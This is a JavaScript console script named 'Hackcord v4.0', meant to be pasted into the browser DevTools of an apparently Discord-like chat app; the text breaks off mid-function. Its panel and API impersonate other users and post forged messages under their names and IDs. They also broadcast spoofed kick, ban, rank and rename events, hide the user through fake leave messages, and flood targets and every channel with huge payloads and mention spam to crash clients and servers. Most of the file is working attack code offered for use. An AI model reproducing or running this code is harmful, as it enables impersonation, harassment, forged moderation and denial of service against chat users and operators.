// ═══════════════════════════════════════════════════════════════
// HACKCORD v4.0 - Server-Side Exploits & Impersonation
// Copy & Paste this entire script into DevTools Console
// ═══════════════════════════════════════════════════════════════

(function() {
    'use strict';
    
    if (window.hackcordLoaded) {
        console.log('⚠️ Hackcord already loaded!');
        return;
    }
    window.hackcordLoaded = true;
    
    // ═══════ CONFIG & STATE ═══════
    const HK = {
        bots: [],
        serverBots: [],
        spyMode: false,
        impersonating: null,
        originalIdentity: null,
        spamInterval: null,
        disabledUsers: new Set(),
        blockedUsers: new Set(),
        mutedUsers: new Set(),
        customTags: new Map(),
        customEmojis: {},
        sounds: {},
        logs: []
    };
    
    const $ = id => document.getElementById(id);
    const rnd = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    
    // ═══════ GUI HTML ═══════
    const guiHTML = `
    <div id="hk-panel" style="
        position: fixed;
        top: 20px;
        right: 20px;
        width: 500px;
        max-height: 95vh;
        background: linear-gradient(145deg, #0f0f1a 0%, #1a1a2e 100%);
        border: 2px solid #00ff41;
        border-radius: 12px;
        box-shadow: 0 0 40px rgba(0,255,65,0.3);
        z-index: 99999;
        font-family: 'Segoe UI', monospace;
        color: #00ff41;
        overflow: hidden;
        resize: both;
    ">
        <div id="hk-header" style="
            background: linear-gradient(90deg, #00ff41 0%, #00d9ff 100%);
            color: #000;
            padding: 12px;
            font-weight: bold;
            font-size: 16px;
            cursor: move;
            display: flex;
            justify-content: space-between;
            align-items: center;
        ">
            <span>🛠️ HACKCORD v4.0</span>
            <div style="display: flex; gap: 10px;">
                <button onclick="Hackcord.toggleSpyMode()" id="hk-spy-btn" style="
                    background: #333; border: 1px solid #00ff41; color: #00ff41;
                    padding: 4px 8px; border-radius: 4px; font-size: 11px; cursor: pointer;
                ">🕵️ Spy: OFF</button>
                <button onclick="Hackcord.toggle()" style="
                    background: rgba(0,0,0,0.2); border: none; color: #000;
                    width: 24px; height: 24px; border-radius: 4px; cursor: pointer;
                ">×</button>
            </div>
        </div>
        
        <div style="display: flex; background: #0a0a12; border-bottom: 1px solid #00ff41;">
            <button class="hk-tab active" data-tab="players" style="flex: 1; padding: 10px; background: transparent; border: none; color: #00ff41; cursor: pointer; border-bottom: 2px solid #00ff41; font-weight: bold; font-size: 10px;">👥 PLAYERS</button>
            <button class="hk-tab" data-tab="server" style="flex: 1; padding: 10px; background: transparent; border: none; color: #666; cursor: pointer; border-bottom: 2px solid transparent; font-weight: bold; font-size: 10px;">🌐 SERVER</button>
            <button class="hk-tab" data-tab="bots" style="flex: 1; padding: 10px; background: transparent; border: none; color: #666; cursor: pointer; border-bottom: 2px solid transparent; font-weight: bold; font-size: 10px;">🤖 BOTS</button>
            <button class="hk-tab" data-tab="exploit" style="flex: 1; padding: 10px; background: transparent; border: none; color: #666; cursor: pointer; border-bottom: 2px solid transparent; font-weight: bold; font-size: 10px;">💥 ATTACKS</button>
            <button class="hk-tab" data-tab="tools" style="flex: 1; padding: 10px; background: transparent; border: none; color: #666; cursor: pointer; border-bottom: 2px solid transparent; font-weight: bold; font-size: 10px;">🛠️ TOOLS</button>
        </div>
        
        <div id="hk-content" style="padding: 12px; overflow-y: auto; max-height: 75vh;">
            
            <!-- PLAYERS TAB -->
            <div id="tab-players" class="hk-section">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <span style="font-size: 13px; color: #00d9ff; font-weight: bold;">👥 Player Manager</span>
                    <button onclick="Hackcord.refreshUsers()" style="background: #00d9ff; border: none; color: #000; padding: 4px 10px; border-radius: 4px; font-size: 10px; font-weight: bold; cursor: pointer;">🔄 Refresh</button>
                </div>
                
                <!-- Impersonation Section -->
                <div style="background: #1a1a3e; border: 1px solid #9b59b6; border-radius: 8px; padding: 10px; margin-bottom: 12px;">
                    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
                        <input type="checkbox" id="hk-impersonate-toggle" onchange="Hackcord.toggleImpersonate()" style="accent-color: #9b59b6;">
                        <label style="font-size: 12px; color: #9b59b6; font-weight: bold;">🎭 Impersonate Mode</label>
                    </div>
                    <select id="hk-impersonate-select" style="width: 100%; background: #0f0f1a; border: 1px solid #9b59b6; color: #9b59b6; padding: 6px; margin-bottom: 8px; border-radius: 4px; font-size: 11px; display: none;">
                        <option value="">Select target...</option>
                    </select>
                    <button id="hk-impersonate-confirm" onclick="Hackcord.confirmImpersonate()" style="width: 100%; background: #9b59b6; border: none; color: #fff; padding: 8px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; display: none;">✨ Confirm Impersonation</button>
                    <div id="hk-impersonate-status" style="font-size: 10px; color: #666; margin-top: 6px; text-align: center;"></div>
                </div>
                
                <div id="hk-player-list" style="background: #0f0f1a; border: 1px solid #333; border-radius: 8px; max-height: 250px; overflow-y: auto; margin-bottom: 10px;">
                    <div style="padding: 20px; text-align: center; color: #666; font-size: 12px;">Click Refresh to load</div>
                </div>
                
                <div id="hk-player-actions" style="background: #1a1a2e; border: 1px solid #00ff41; border-radius: 8px; padding: 10px; display: none;">
                    <div style="margin-bottom: 8px; padding-bottom: 8px; border-bottom: 1px solid #333;">
                        <span style="color: #00d9ff; font-size: 11px;">Target:</span>
                        <span id="hk-selected-name" style="color: #fff; font-weight: bold; margin-left: 6px; font-size: 13px;"></span>
                        <div id="hk-selected-id" style="color: #666; font-size: 9px; font-family: monospace; margin-top: 2px;"></div>
                    </div>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
                        <button onclick="Hackcord.forceMessage()" style="background: #3498db; border: none; color: #fff; padding: 6px; border-radius: 4px; font-size: 10px; cursor: pointer;">💬 Force Msg</button>
                        <button onclick="Hackcord.changeTheirUsername()" style="background: #e67e22; border: none; color: #fff; padding: 6px; border-radius: 4px; font-size: 10px; cursor: pointer;">📝 Change Name</button>
                    </div>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
                        <button onclick="Hackcord.selectedKick()" style="background: #ff9100; border: none; color: #000; padding: 6px; border-radius: 4px; font-size: 10px; font-weight: bold; cursor: pointer;">👢 Kick</button>
                        <button onclick="Hackcord.selectedBan()" style="background: #ff0040; border: none; color: #fff; padding: 6px; border-radius: 4px; font-size: 10px; font-weight: bold; cursor: pointer;">🔨 Ban</button>
                    </div>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
                        <button onclick="Hackcord.selectedDisconnect()" style="background: #e74c3c; border: none; color: #fff; padding: 6px; border-radius: 4px; font-size: 10px; cursor: pointer;">🔌 Disconnect</button>
                        <button onclick="Hackcord.selectedCrash()" style="background: #9b59b6; border: none; color: #fff; padding: 6px; border-radius: 4px; font-size: 10px; cursor: pointer;">💥 Crash</button>
                    </div>
                    
                    <div style="margin-bottom: 8px;">
                        <select id="hk-role-set" style="width: 70%; background: #0f0f1a; border: 1px solid #ffd700; color: #ffd700; padding: 5px; border-radius: 4px; font-size: 10px;">
                            <option value="owner">👑 Owner</option>
                            <option value="admin">⭐ Admin</option>
                            <option value="mod">🛡️ Mod</option>
                            <option value="tmod">🔰 TMod</option>
                            <option value="user">👤 User</option>
                        </select>
                        <button onclick="Hackcord.selectedSetRole()" style="width: 28%; background: #ffd700; border: none; color: #000; padding: 5px; border-radius: 4px; font-size: 10px; font-weight: bold; cursor: pointer;">Set</button>
                    </div>
                    
                    <div style="display: flex; gap: 6px;">
                        <div style="flex: 1; display: flex; align-items: center; gap: 4px; background: #0f0f1a; padding: 5px; border-radius: 4px;">
                            <input type="checkbox" id="hk-disable-toggle" onchange="Hackcord.selectedDisable()" style="accent-color: #ff4757;">
                            <label for="hk-disable-toggle" style="font-size: 10px; color: #ff4757; cursor: pointer;">🚫 Disable</label>
                        </div>
                        <div style="flex: 1; display: flex; align-items: center; gap: 4px; background: #0f0f1a; padding: 5px; border-radius: 4px;">
                            <input type="checkbox" id="hk-mute-toggle" onchange="Hackcord.selectedMute()" style="accent-color: #ff0040;">
                            <label for="hk-mute-toggle" style="font-size: 10px; color: #ff0040; cursor: pointer;">🔇 Mute</label>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- SERVER TAB -->
            <div id="tab-server" class="hk-section" style="display: none;">
                <div style="font-size: 13px; color: #00d9ff; font-weight: bold; margin-bottom: 12px;">🌐 Server Settings</div>
                
                <!-- Add Server Bot -->
                <div style="background: #1a1a2e; border: 1px solid #00ff41; border-radius: 8px; padding: 12px; margin-bottom: 12px;">
                    <div style="font-size: 12px; color: #00ff41; font-weight: bold; margin-bottom: 8px;">🤖 Add Server Bot</div>
                    
                    <input type="text" id="hk-server-bot-name" placeholder="Bot Name" style="width: 100%; background: #0f0f1a; border: 1px solid #333; color: #fff; padding: 6px; margin-bottom: 6px; border-radius: 4px; font-size: 11px;">
                    
                    <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 6px; background: #0f0f1a; padding: 6px; border-radius: 4px;">
                        <input type="checkbox" id="hk-server-bot-visible" checked style="accent-color: #00ff41;">
                        <label style="font-size: 11px; color: #ccc;">Show in Server</label>
                    </div>
                    
                    <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 6px; background: #0f0f1a; padding: 6px; border-radius: 4px;">
                        <input type="checkbox" id="hk-server-bot-admin" style="accent-color: #ffd700;">
                        <label style="font-size: 11px; color: #ffd700;">Admin Bot Mode</label>
                    </div>
                    
                    <input type="number" id="hk-server-bot-timeout" placeholder="Timeout (ms, 0 = forever)" value="0" style="width: 100%; background: #0f0f1a; border: 1px solid #333; color: #fff; padding: 6px; margin-bottom: 8px; border-radius: 4px; font-size: 11px;">
                    
                    <button onclick="Hackcord.spawnServerBot()" style="width: 100%; background: linear-gradient(90deg, #00ff41, #00d9ff); border: none; color: #000; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 12px;">✨ Spawn Server Bot</button>
                </div>
                
                <!-- Server Bot Manager -->
                <div style="background: #1a1a2e; border: 1px solid #9b59b6; border-radius: 8px; padding: 12px;">
                    <div style="font-size: 12px; color: #9b59b6; font-weight: bold; margin-bottom: 8px;">🎮 Server Bot Manager</div>
                    <div id="hk-server-bot-list" style="max-height: 150px; overflow-y: auto;">
                        <div style="padding: 10px; text-align: center; color: #666; font-size: 11px;">No server bots active</div>
                    </div>
                </div>
                
                <div style="margin-top: 12px; padding-top: 12px; border-top: 1px solid #333;">
                    <button onclick="Hackcord.changeServerName()" style="width: 100%; background: #ffd700; border: none; color: #000; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 12px; margin-bottom: 8px;">📝 Change Server Name</button>
                    <button onclick="Hackcord.wipeChat()" style="width: 100%; background: #ff4757; border: none; color: #fff; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 12px;">🗑️ Wipe Chat History</button>
                </div>
            </div>
            
            <!-- BOTS TAB -->
            <div id="tab-bots" class="hk-section" style="display: none;">
                <div style="font-size: 13px; color: #00d9ff; font-weight: bold; margin-bottom: 10px;">🤖 Bot Army</div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 10px;">
                    <div>
                        <label style="font-size: 10px; color: #666;">Prefix</label>
                        <input type="text" id="hk-bot-prefix" value="Bot_" style="width: 100%; background: #0f0f1a; border: 1px solid #00ff41; color: #00ff41; padding: 5px; border-radius: 4px; font-size: 11px;">
                    </div>
                    <div>
                        <label style="font-size: 10px; color: #666;">Count</label>
                        <input type="number" id="hk-bot-count" value="5" min="1" max="50" style="width: 100%; background: #0f0f1a; border: 1px solid #00ff41; color: #00ff41; padding: 5px; border-radius: 4px; font-size: 11px;">
                    </div>
                </div>
                
                <input type="text" id="hk-bot-msg" placeholder="Spam message (optional)" style="width: 100%; background: #0f0f1a; border: 1px solid #00ff41; color: #00ff41; padding: 6px; margin-bottom: 8px; border-radius: 4px; font-size: 11px;">
                
                <input type="number" id="hk-bot-timeout" placeholder="Bot timeout in ms (0 = no timeout)" value="0" style="width: 100%; background: #0f0f1a; border: 1px solid #00ff41; color: #00ff41; padding: 6px; margin-bottom: 8px; border-radius: 4px; font-size: 11px;">
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                    <button onclick="Hackcord.spawnBots()" style="background: linear-gradient(90deg, #00ff41, #00d9ff); border: none; color: #000; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px;">🚀 Spawn</button>
                    <button onclick="Hackcord.killBots()" style="background: #ff0040; border: none; color: #fff; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px;">💀 Kill All</button>
                </div>
                
                <div id="hk-bot-list" style="margin-top: 10px; max-height: 150px; overflow-y: auto;"></div>
            </div>
            
            <!-- ATTACKS TAB -->
            <div id="tab-exploit" class="hk-section" style="display: none;">
                <div style="font-size: 13px; color: #ff0040; font-weight: bold; margin-bottom: 10px;">💣 Server Attacks</div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 10px;">
                    <button onclick="Hackcord.crashServer()" style="background: linear-gradient(90deg, #ff0040, #ff9100); border: none; color: #fff; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 11px;">☠️ Crash Server</button>
                    <button onclick="Hackcord.freezeServer()" style="background: #00d9ff; border: none; color: #000; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 11px;">❄️ Freeze 10s</button>
                </div>
                
                <div style="background: #1a1a2e; border: 1px solid #ff0040; border-radius: 8px; padding: 10px; margin-bottom: 10px;">
                    <div style="font-size: 11px; color: #ff0040; margin-bottom: 6px;">Target Specific User</div>
                    <input type="text" id="hk-attack-uid" placeholder="User ID" style="width: 100%; background: #0f0f1a; border: 1px solid #ff0040; color: #ff0040; padding: 6px; margin-bottom: 6px; border-radius: 4px; font-size: 11px;">
                    <button onclick="Hackcord.attackUser()" style="width: 100%; background: #ff0040; border: none; color: #fff; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px;">🎯 Attack User</button>
                </div>
                
                <div style="background: #1a1a2e; border: 1px solid #9b59b6; border-radius: 8px; padding: 10px;">
                    <div style="font-size: 11px; color: #9b59b6; margin-bottom: 6px;">Mass Spam</div>
                    <input type="text" id="hk-mass-msg" placeholder="Message" style="width: 100%; background: #0f0f1a; border: 1px solid #9b59b6; color: #fff; padding: 6px; margin-bottom: 6px; border-radius: 4px; font-size: 11px;">
                    <button onclick="Hackcord.massSpam()" style="width: 100%; background: #9b59b6; border: none; color: #fff; padding: 8px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px;">📨 Send to All Channels</button>
                </div>
            </div>
            
            <!-- TOOLS TAB -->
            <div id="tab-tools" class="hk-section" style="display: none;">
                <div style="font-size: 13px; color: #00ff41; font-weight: bold; margin-bottom: 10px;">🛠️ Tools</div>
                
                <div style="background: #1a1a2e; border: 1px solid #00ff41; border-radius: 8px; padding: 10px; margin-bottom: 10px;">
                    <div style="font-size: 11px; color: #00ff41; margin-bottom: 6px;">Custom Tag</div>
                    <input type="text" id="hk-tag-text" placeholder="Tag text" style="width: 100%; background: #0f0f1a; border: 1px solid #00ff41; color: #00ff41; padding: 6px; margin-bottom: 6px; border-radius: 4px; font-size: 11px;">
                    <select id="hk-tag-theme" style="width: 100%; background: #0f0f1a; border: 1px solid #00ff41; color: #00ff41; padding: 6px; margin-bottom: 6px; border-radius: 4px; font-size: 11px;">
                        <option value="rainbow">🌈 Rainbow</option>
                        <option value="hacker">💻 Hacker</option>
                        <option value="fire">🔥 Fire</option>
                        <option value="admin">⚡ Admin</option>
                    </select>
                    <button onclick="Hackcord.addTag()" style="width: 100%; background: #00ff41; border: none; color: #000; padding: 6px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px;">Apply Tag</button>
                </div>
            </div>
            
        </div>
        
        <div style="background: #0a0a12; border-top: 1px solid #00ff41; padding: 8px; font-size: 10px; color: #666; text-align: center;">
            Hackcord v4.0 | Server-Side Enabled
        </div>
    </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', guiHTML);
    
    // Make draggable
    const panel = $('hk-panel');
    const header = $('hk-header');
    let isDragging = false, xOffset = 0, yOffset = 0;
    
    header.addEventListener('mousedown', (e) => {
        isDragging = true;
        xOffset = e.clientX - panel.offsetLeft;
        yOffset = e.clientY - panel.offsetTop;
    });
    
    document.addEventListener('mousemove', (e) => {
        if (isDragging) {
            panel.style.left = (e.clientX - xOffset) + 'px';
            panel.style.top = (e.clientY - yOffset) + 'px';
            panel.style.right = 'auto';
        }
    });
    
    document.addEventListener('mouseup', () => isDragging = false);
    
    // Tab switching
    document.querySelectorAll('.hk-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.hk-tab').forEach(t => {
                t.style.color = '#666';
                t.style.borderBottom = '2px solid transparent';
            });
            tab.style.color = '#00ff41';
            tab.style.borderBottom = '2px solid #00ff41';
            document.querySelectorAll('.hk-section').forEach(s => s.style.display = 'none');
            $(`tab-${tab.dataset.tab}`).style.display = 'block';
        });
    });
    
    // Keyboard shortcut
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.key === 'h') {
            e.preventDefault();
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        }
    });
    
    // ═══════ HACKCORD API ═══════
    window.Hackcord = {
        toggle: () => {
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        },
        
        log: (msg) => {
            console.log('%c[HACKCORD]', 'color: #00ff41; font-weight: bold;', msg);
        },
        
        // ═══════ SPY MODE ═══════
        toggleSpyMode: () => {
            HK.spyMode = !HK.spyMode;
            $('hk-spy-btn').textContent = `🕵️ Spy: ${HK.spyMode ? 'ON' : 'OFF'}`;
            $('hk-spy-btn').style.background = HK.spyMode ? '#00ff41' : '#333';
            $('hk-spy-btn').style.color = HK.spyMode ? '#000' : '#00ff41';
            
            if (HK.spyMode) {
                // Send leave message
                if (window.CS && window.pub) {
                    window.pub(window.sc(window.CS().code, 'sys'), {
                        t: 'leave',
                        uid: window.S?.uid,
                        u: window.S?.u
                    });
                    // Remove from members
                    if (window.CS().mem[window.S?.uid]) {
                        delete window.CS().mem[window.S?.uid];
                    }
                    if (window.updMem) window.updMem();
                }
            } else {
                // Send join message
                if (window.CS && window.pub) {
                    window.pub(window.sc(window.CS().code, 'sys'), {
                        t: 'join',
                        uid: window.S?.uid,
                        u: window.S?.u,
                        ac: window.S?.ac,
                        nc: window.S?.nc,
                        bio: window.S?.bio || '',
                        vc: null
                    });
                }
            }
            Hackcord.log(`Spy Mode ${HK.spyMode ? 'enabled' : 'disabled'}`);
        },
        
        // ═══════ IMPERSONATION ═══════
        toggleImpersonate: () => {
            const enabled = $('hk-impersonate-toggle').checked;
            const select = $('hk-impersonate-select');
            const confirmBtn = $('hk-impersonate-confirm');
            
            if (enabled) {
                select.style.display = 'block';
                confirmBtn.style.display = 'block';
                Hackcord.refreshImpersonateList();
                // Auto refresh every 3s
                HK.impersonateInterval = setInterval(Hackcord.refreshImpersonateList, 3000);
            } else {
                select.style.display = 'none';
                confirmBtn.style.display = 'none';
                if (HK.impersonateInterval) clearInterval(HK.impersonateInterval);
                // Restore identity
                if (HK.originalIdentity) {
                    window.S.u = HK.originalIdentity.u;
                    window.S.ac = HK.originalIdentity.ac;
                    window.S.nc = HK.originalIdentity.nc;
                    window.S.customPic = HK.originalIdentity.pic;
                    HK.impersonating = null;
                    $('hk-impersonate-status').textContent = 'Identity restored';
                }
            }
        },
        
        refreshImpersonateList: () => {
            if (!window.CS) return;
            const select = $('hk-impersonate-select');
            const current = select.value;
            let html = '<option value="">Select target...</option>';
            
            Object.entries(window.CS().mem).forEach(([uid, data]) => {
                if (uid !== window.S?.uid) {
                    html += `<option value="${uid}|${data.u}|${data.ac}|${data.pic || ''}">${data.u}</option>`;
                }
            });
            
            select.innerHTML = html;
            select.value = current;
        },
        
        confirmImpersonate: () => {
            const val = $('hk-impersonate-select').value;
            if (!val) return alert('Select a target');
            
            const [uid, name, color, pic] = val.split('|');
            
            // Save original
            if (!HK.originalIdentity) {
                HK.originalIdentity = {
                    u: window.S.u,
                    ac: window.S.ac,
                    nc: window.S.nc,
                    pic: window.S.customPic
                };
            }
            
            // Set new identity
            window.S.u = name;
            window.S.ac = color;
            window.S.nc = '#fff';
            window.S.customPic = pic;
            HK.impersonating = uid;
            
            // If spy mode, stay hidden, otherwise announce
            if (!HK.spyMode) {
                // Send join as this user
                window.pub(window.sc(window.CS().code, 'sys'), {
                    t: 'join',
                    uid: window.S?.uid, // Keep same UID but different name
                    u: name,
                    ac: color,
                    nc: '#fff',
                    bio: '',
                    vc: null
                });
            }
            
            $('hk-impersonate-status').textContent = `Impersonating ${name}`;
            Hackcord.log(`Now impersonating: ${name}`);
        },
        
        // ═══════ PLAYER MANAGER ═══════
        refreshUsers: () => {
            if (!window.CS) return;
            const list = $('hk-player-list');
            const mem = window.CS().mem || {};
            
            let html = '';
            // Add self
            html += Hackcord.createPlayerRow(window.S?.uid, window.S?.u, window.S?.ac, true);
            
            // Add others
            Object.entries(mem).forEach(([uid, data]) => {
                if (uid !== window.S?.uid) {
                    html += Hackcord.createPlayerRow(uid, data.u, data.ac, false);
                }
            });
            
            list.innerHTML = html || '<div style="padding: 20px; text-align: center; color: #666;">No users</div>';
        },
        
        createPlayerRow: (uid, name, color, isSelf) => {
            const initial = (name || '?').charAt(0).toUpperCase();
            const isMuted = HK.mutedUsers.has(uid);
            const isDisabled = HK.disabledUsers.has(uid);
            
            return `
            <div onclick="Hackcord.selectPlayer('${uid}', '${name.replace(/'/g, "\\'")}', '${color}')" 
                 style="padding: 8px; border-bottom: 1px solid #333; cursor: pointer; display: flex; align-items: center; gap: 8px; ${isSelf ? 'background: rgba(0,255,65,0.1);' : ''} ${isMuted ? 'opacity: 0.5;' : ''}"
                 onmouseenter="this.style.background='#1a1a3e'" 
                 onmouseleave="this.style.background='${isSelf ? 'rgba(0,255,65,0.1)' : 'transparent'}'">
                <div style="width: 28px; height: 28px; border-radius: 50%; background: ${color || '#5865f2'}; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #fff; font-size: 12px;">${initial}</div>
                <div style="flex: 1; min-width: 0;">
                    <div style="color: #fff; font-weight: 600; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${name} ${isSelf ? '<span style="color: #00ff41;">(You)</span>' : ''}</div>
                    <div style="color: #666; font-size: 9px; font-family: monospace;">${uid}</div>
                </div>
                ${isMuted ? '<span style="color: #ff0040; font-size: 9px;">🔇</span>' : ''}
                ${isDisabled ? '<span style="color: #ff4757; font-size: 9px;">🚫</span>' : ''}
            </div>`;
        },
        
        selectPlayer: (uid, name, color) => {
            $('hk-player-actions').style.display = 'block';
            $('hk-selected-name').textContent = name;
            $('hk-selected-id').textContent = uid;
            HK.selectedPlayer = {uid, name, color};
            
            $('hk-disable-toggle').checked = HK.disabledUsers.has(uid);
            $('hk-mute-toggle').checked = HK.mutedUsers.has(uid);
        },
        
        // ═══════ MODERATION (SERVER-SIDE) ═══════
        selectedKick: () => {
            if (!HK.selectedPlayer) return;
            const reason = prompt(`Kick ${HK.selectedPlayer.name}:`, 'Kicked by admin');
            if (!reason) return;
            
            // Send to sys channel - this will be broadcast to all
            window.pub(window.sc(window.CS().code, 'sys'), {
                t: 'kicked',
                uid: HK.selectedPlayer.uid,
                name: HK.selectedPlayer.name,
                by: window.S?.u,
                reason: reason
            });
            
            // Also try auth
            if (window.authAction) {
                window.authAction({
                    t: 'kick',
                    target: HK.selectedPlayer.uid,
                    reason: reason
                });
            }
            
            // Remove locally
            if (window.CS().mem[HK.selectedPlayer.uid]) {
                delete window.CS().mem[HK.selectedPlayer.uid];
                window.addSys(window.CS().ch, `${HK.selectedPlayer.name} was kicked by ${window.S?.u} (${reason})`);
                if (window.render) window.render();
                if (window.updMem) window.updMem();
            }
            
            Hackcord.log(`Kicked ${HK.selectedPlayer.name}`);
        },
        
        selectedBan: () => {
            if (!HK.selectedPlayer) return;
            const reason = prompt(`Ban ${HK.selectedPlayer.name}:`, 'Banned');
            if (!reason) return;
            const duration = prompt('Duration (minutes, 0 = permanent):', '0');
            
            // Broadcast ban
            window.pub(window.sc(window.CS().code, 'sys'), {
                t: 'banned',
                uid: HK.selectedPlayer.uid,
                name: HK.selectedPlayer.name,
                by: window.S?.u,
                reason: reason,
                duration: parseInt(duration) || 0
            });
            
            if (window.authAction) {
                window.authAction({
                    t: 'ban',
                    target: HK.selectedPlayer.uid,
                    reason: reason
                });
            }
            
            // Add to banned list
            if (!window.CS().banned) window.CS().banned = {};
            window.CS().banned[HK.selectedPlayer.uid] = {
                name: HK.selectedPlayer.name,
                by: window.S?.u,
                reason: reason,
                time: Date.now()
            };
            
            delete window.CS().mem[HK.selectedPlayer.uid];
            window.addSys(window.CS().ch, `${HK.selectedPlayer.name} was banned by ${window.S?.u}`);
            if (window.render) window.render();
            if (window.updMem) window.updMem();
            
            Hackcord.log(`Banned ${HK.selectedPlayer.name}`);
        },
        
        selectedDisconnect: () => {
            if (!HK.selectedPlayer) return;
            
            // Force leave
            window.pub(window.sc(window.CS().code, 'sys'), {
                t: 'leave',
                uid: HK.selectedPlayer.uid,
                u: HK.selectedPlayer.name
            });
            
            // Also send disconnect signal
            window.pub(window.sc(window.CS().code, 'sys'), {
                t: 'disconnect',
                uid: HK.selectedPlayer.uid,
                name: HK.selectedPlayer.name,
                by: window.S?.u
            });
            
            delete window.CS().mem[HK.selectedPlayer.uid];
            window.addSys(window.CS().ch, `${HK.selectedPlayer.name} disconnected`);
            if (window.updMem) window.updMem();
            
            Hackcord.log(`Disconnected ${HK.selectedPlayer.name}`);
        },
        
        selectedCrash: () => {
            if (!HK.selectedPlayer) return;
            
            // Method 1: Massive DM
            for (let i = 0; i < 10; i++) {
                setTimeout(() => {
                    window.pub(`dc.inv.${HK.selectedPlayer.uid}`, {
                        t: 'dm_invite',
                        from: window.S?.uid,
                        fromName: window.S?.u,
                        code: 'X'.repeat(50000),
                        ts: Date.now()
                    });
                }, i * 100);
            }
            
            // Method 2: Spam mentions
            const channels = ['general', 'off-topic', 'memes'];
            channels.forEach((ch, idx) => {
                for (let i = 0; i < 50; i++) {
                    setTimeout(() => {
                        window.pub(window.sc(window.CS().code, ch), {
                            t: 'msg',
                            u: window.S?.u,
                            ac: window.S?.ac,
                            nc: window.S?.nc,
                            x: `@${HK.selectedPlayer.name} ` + '💀'.repeat(100),
                            fx: 'shout',
                            ts: Date.now()
                        });
                    }, i * 50 + idx * 100);
                }
            });
            
            Hackcord.log(`Attacking ${HK.selectedPlayer.name}`);
        },
        
        selectedSetRole: () => {
            if (!HK.selectedPlayer) return;
            const role = $('hk-role-set').value;
            
            // Broadcast rank update
            window.pub(window.sc(window.CS().code, 'sys'), {
                t: 'rank_update',
                uid: HK.selectedPlayer.uid,
                rank: role === 'user' ? null : role,
                by: window.S?.u
            });
            
            if (window._ranks) window._ranks.set(HK.selectedPlayer.uid, role === 'user' ? null : role);
            if (window.updMem) window.updMem();
            
            Hackcord.log(`Set ${HK.selectedPlayer.name} as ${role}`);
        },
        
        selectedDisable: () => {
            if (!HK.selectedPlayer) return;
            const disable = $('hk-disable-toggle').checked;
            
            if (disable) {
                HK.disabledUsers.add(HK.selectedPlayer.uid);
                // Broadcast disable command
                window.pub(`hk.disable.${HK.selectedPlayer.uid}`, {t: 'disable'});
            } else {
                HK.disabledUsers.delete(HK.selectedPlayer.uid);
                window.pub(`hk.disable.${HK.selectedPlayer.uid}`, {t: 'enable'});
            }
            
            Hackcord.log(`${disable ? 'Disabled' : 'Enabled'} ${HK.selectedPlayer.name}`);
        },
        
        selectedMute: () => {
            if (!HK.selectedPlayer) return;
            const mute = $('hk-mute-toggle').checked;
            if (mute) HK.mutedUsers.add(HK.selectedPlayer.uid);
            else HK.mutedUsers.delete(HK.selectedPlayer.uid);
            if (window.render) window.render();
        },
        
        forceMessage: () => {
            if (!HK.selectedPlayer) return;
            const msg = prompt(`Send message as ${HK.selectedPlayer.name}:`, 'Hello');
            if (!msg) return;
            
            // Send message with their UID but our name (or spoof)
            window.pub(window.sc(window.CS().ch), {
                t: 'msg',
                u: HK.selectedPlayer.name,
                ac: HK.selectedPlayer.color,
                nc: '#fff',
                x: msg,
                fx: null,
                ts: Date.now(),
                uid: HK.selectedPlayer.uid
            });
            
            // Add to local
            window.CS().ms[window.CS().ch].push({
                t: 'u',
                a: HK.selectedPlayer.name,
                ac: HK.selectedPlayer.color,
                nc: '#fff',
                x: msg,
                ts: Date.now(),
                uid: HK.selectedPlayer.uid
            });
            
            if (window.render) window.render();
        },
        
        changeTheirUsername: () => {
            if (!HK.selectedPlayer) return;
            const newName = prompt(`New username for ${HK.selectedPlayer.name}:`, HK.selectedPlayer.name);
            if (!newName) return;
            
            // Update in mem
            if (window.CS().mem[HK.selectedPlayer.uid]) {
                window.CS().mem[HK.selectedPlayer.uid].u = newName;
                
                // Broadcast update
                window.pub(window.sc(window.CS().code, 'sys'), {
                    t: 'name_change',
                    uid: HK.selectedPlayer.uid,
                    oldName: HK.selectedPlayer.name,
                    newName: newName,
                    by: window.S?.u
                });
                
                if (window.updMem) window.updMem();
                if (window.render) window.render();
                Hackcord.refreshUsers();
            }
        },
        
        // ═══════ SERVER ATTACKS ═══════
        crashServer: () => {
            if (!window.CS) return;
            
            // Massive spam to all channels
            const msg = '💀'.repeat(500);
            window.S.servers.forEach(srv => {
                ['general', 'off-topic', 'memes'].forEach(ch => {
                    for (let i = 0; i < 100; i++) {
                        setTimeout(() => {
                            window.pub(window.scp(srv.code, ch), {
                                t: 'msg',
